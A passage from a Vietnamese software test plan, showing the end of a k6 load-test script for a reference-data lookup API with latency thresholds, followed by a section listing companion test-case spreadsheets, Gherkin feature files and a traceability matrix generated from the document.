  scenarios: { lookup: { executor: 'constant-arrival-rate', rate: 5000, timeUnit: '1s', duration: '15m', preAllocatedVUs: 400 } },
  thresholds: { 'http_req_duration{name:lookup}': ['p(95)<20', 'p(99)<50'], http_req_failed: ['rate<0.001'] },
};
const codes = JSON.parse(open('./data/codes-t68.json'));
export default function () {
  const c = codes[Math.floor(Math.random() * codes.length)];
  const r = http.get(`${__ENV.BASE}/api/rdm/v1/catalogs/${c.catalog}/items/${c.code}`,
    { headers: { Authorization: `Bearer ${__ENV.TOKEN}` }, tags: { name: 'lookup' } });
  check(r, { '200': (x) => x.status === 200 });
}
```

### 9.5. Tệp đi kèm

Ba tệp sau được sinh từ chính tài liệu này bằng công cụ trong `ph07/tools/`, nên luôn khớp với nội dung các mục 4, 5, 7. Khi sửa test case, sửa trong tài liệu rồi chạy lại công cụ; không sửa tay tệp sinh ra.

| Tệp | Nội dung | Công cụ |
|---|---|---|
| [`ph07/D05-02-PH07-test-case.xlsx`](ph07/D05-02-PH07-test-case.xlsx) | Sheet `TestCase` (320 dòng: mã, kịch bản, tên, loại, ưu tiên, tự động, FR, LGC, truy vết khác, dữ liệu, bước, mong đợi, cột trống Kết quả, Người chạy, Ngày, Lỗi); sheet `UAT` (15 dòng); sheet `TruyVet` (FR → TC); sheet `HuongDan` | `gen_xlsx.py` |
| [`ph07/gherkin/`](ph07/gherkin/) | Một tệp `.feature` (tiếng Việt, `# language: vi`) cho mỗi kịch bản TS-07-01…29 và một tệp `uat-tuong-duong-aita.feature` cho mục 7; mỗi ca là một `Kịch bản` mang thẻ `@TC-07-nnn`, `@P1`… | `gen_gherkin.py` |
| Mục 8 của tài liệu này | Ma trận truy vết | `gen_matrix.py` |

Tệp Gherkin dùng làm đặc tả có thể đọc được cho cán bộ nghiệp vụ và làm khung cho các bước tự động hóa Cucumber ở mức nghiệm thu; ca ở mức đơn vị và tích hợp vẫn viết bằng JUnit như mục 9.2.
